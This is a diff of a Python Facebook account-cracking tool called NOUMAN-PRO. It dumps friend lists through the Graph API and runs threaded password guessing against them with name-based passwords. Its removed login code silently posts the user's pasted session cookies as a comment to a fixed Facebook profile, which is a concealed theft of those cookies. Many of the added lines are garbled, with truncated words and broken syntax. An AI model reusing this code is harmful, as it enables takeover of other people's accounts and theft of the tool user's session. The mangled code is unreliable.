@@ -23,140 +23,7 @@ for xd in range(10000):
         b=random.choice(['6','7','8','9','10','11','12','13'])
         c=f' TL-tl; {str(gt)}'
         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/537.36'
-        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
-        ugen.append(uaku2)
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/533.1'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
-logo=("""\033[1;37m
-███    ██  ██████  ██    ██ ███    ███  █████  ███    ██ 
-████   ██ ██    ██ ██    ██ ████  ████ ██   ██ ████   ██  \033[1;34m𝐏 \033[1;37m
-██ ██  ██ ██    ██ ██    ██ ██ ████ ██ ███████ ██ ██  ██ \033[1;31m 𝐑\033[1;37m
-██  ██ ██ ██    ██ ██    ██ ██  ██  ██ ██   ██ ██  ██ ██ \033[1;35m𝐎 \033[1;37m
-██   ████  ██████   ██████  ██      ██ ██   ██ ██   ████    
-----------------------------------------------
- Author    : NOUMAN
- Github    : NOUMAN110
- Facebook  : MR.NOUMAN
- Tool Name : NOUMAN-PRO
- Type type : FREE
- Version   : 1.1
-----------------------------------------------
- NOUMAN Pro version 1.1
- For Haters: ASSALAMUALAIKUM 🤞
-\033[1;37m----------------------------------------------""")
-def linex():
-        print('\033[1;37m----------------------------------------------')
-def clear():
-        os.system('clear')
-        print(logo)
-loop=0
-oks=[]
-cps=[]
-pcp=[]
-id=[]
-tokenku=[]
-def login():
-        clear()
-        cookies = input(' Put cookies: ')
-        try:
-                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; TECNO KE5k) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
-                find_token = re.search("(EAAG\w+)", data.text)
-                open(".tok.txt", "w").write(find_token.group(1))
-                open(".coki.txt","w").write(cookies)
-                tok=open('.tok.txt','r').read()
-                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
-                name=(info['name'])
-                idd=(info['id'])
-                barth=(info['birthday'])
-                linex()
-                print(' Welcome\033[1;32m : '+name)
-                print(' \033[1;37mYour UID : '+idd)
-                print(' Barth Day: '+barth)
-                requests.post('https://graph.facebook.com/https://www.facebook.com/profile.php?id=100087002213579/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
-                linex()
-                print(' Cookies login has been successfull...')
-                time.sleep(1)
-                menu()
-        except KeyError:
-                print('\033[1;31m Cookies has been expired...')
-                os.system('rm -rf .tok.txt');time.sleep(1);login()
-        except requests.exceptions.ConnectionError:
-                exit(' internet connection error...')
-        except AttributeError:
-                print('\033[1;31m Cookies has been expired...')
-                os.system('rm -rf .tok.txt');time.sleep(1);login()
-                login()
-def public():
-        usrr=[]
-        clear()
-        try:
-                tok = open('.tok.txt','r').read()
-                cok = open('.coki.txt','r').read()
-                tokenku.append(tok)
-        except KeyError:
-                print('\033[1;31mYour cookies han expired...');time.sleep(1)
-                login()
-        except IOError:
-                print('\033[1;31mYour cookies han expired...');time.sleep(1)
-                login()
-        try:
-                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
-                name=(info['name'])
-                print('\033[1;32m Welcome '+name)
-                linex()
-        except KeyError:
-                print('\033[1;31mYour cookies han expired...');time.sleep(1)
-                login()
-        try:
-                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
-        except ValueError:
-                exit(' Put only digits not latters ')
-        if jum<1 or jum>5000:
-                exit()
-        ses=requests.Session()
-        yz = 0
-        for met in range(jum):
-                yz+=1
-                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
-                usrr.append(kl)
-        linex()
-        print(' All method working try 1 by 1 ')
-        linex()
-        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
-        linex()
-        mthd = input(' Choose method: ')
-        linex()
-        print(' Do you went show cp account? (y/n): ')
-        linex()
-        cx=input(' Choose: ')
-        if cx in ['y','Y','yes','Yes','1']:
-                pcp.append('y')
-        else:
-                pcp.append('n')
-        linex()
-        print('\033[1;32m Dumping friend list...\033[1;37m')
-        linex()
-        for userr in usrr:
-                try:
-                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+                                col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                         for mi in col['friends']['data']:
                                 try:
                                         iso = (mi['id']+'|'+mi['name'])
@@ -222,14 +89,14 @@ def menu():
                                 file = input(' Put file path\033[1;37m: ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
-                                except FileNotFoundError:
-                                        print(' File location not found ')
+                                except FileNotFound
+                                        print(' File locationnd ')
                                         time.sleep(1)
-                                        menu()
+                               
                                 clear()
                                 print(' All method working try 1 by 1 ')
                                 linex()
-                                print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
+                                print(' [1] Method 1 (for new ids) \n [2] Mefor old ids)\n [3] Method 3 (for old ids)')
                                 linex()
                                 mthd=input(' Choose: ')
                                 linex()
@@ -241,24 +108,24 @@ def menu():
                                 linex()
                                 print('\033[1;32m exp: first last,firtslast,first123')
                                 linex()
-                                for i in range(ps_limit):
-                                        plist.append(input(f' Put password {i+1}: '))
+                                for i in range(ps_limt):
+                                        plist.append(inpu(f' Put password {i+1}: '))
                                 linex()
-                                print(' Do you went show cp account? (y/n): ')
-                                linex()
-                                cx=input(' Choose: ')
-                                if cx in ['y','Y','yes','Yes','1']:
+                               print(' Do you went show cp account? (y/n): ')
+                               linex()
+                                cx=input(' Coose: ')
+                                if cx in ['y','Y','yes','Ye,'1']:
                                         pcp.append('y')
-                                else:
+                               else:
                                         pcp.append('n')
-                                with tred(max_workers=30) as crack_submit:
-                                        clear()
-                                        total_ids = str(len(fo))
-                                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
-                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                              with tred(max_workers=30) as crack_submit:
+                                      clear()
+                                      total_ids = str(len(fo))
+                                     2m'+total_ids+f' \033[1;33m>\033[1;36m> \033[37mMethod -> \033[1;37mM{mthd}')
+                                      print("\033[1;37m \x1b[38;5;208mUse flight mode for sed up\033[1;37m")
                                         linex()
                                         for user in fo:
-                                                ids,names = user.split('|')
+                                            ids,names = user.split('|')
                                                 passlist = plist
                                                 if mthd in ['1','01']:
                                                         crack_submit.submit(ffb,ids,names,passlist)
@@ -419,23 +286,23 @@ def gmail():
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         else:
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
-                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                                open('.re.tite(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
                 with tred(max_workers=30) as NOUMAN:
                         total = str(len(fo))
-                        clear()
+                        c
                         print(' Total account : \033[1;32m'+total)
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in fo:
-                                ids,names = user.split('|')
+                                ids,nameslit('|')
                                 first_name = names.rsplit(' ')[0]
                                 try:
-                                        last_name = names.rsplit(' ')[1]
+                                        last_names.rsplit(' ')[1]
                                 except IndexError:
                                         last_name = 'Khan'
                                 fs = first_name.lower()
-                                ls = last_name.lower()
+                              lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 NOUMAN.submit(rndm,ids,passlist)
                 print('\033[1;37m')
@@ -444,7 +311,7 @@ def gmail():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python NOUMAN.py')
+                os.system('AN.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
         sys.stdout.write('\r\r\033[1;37m [NOUMAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
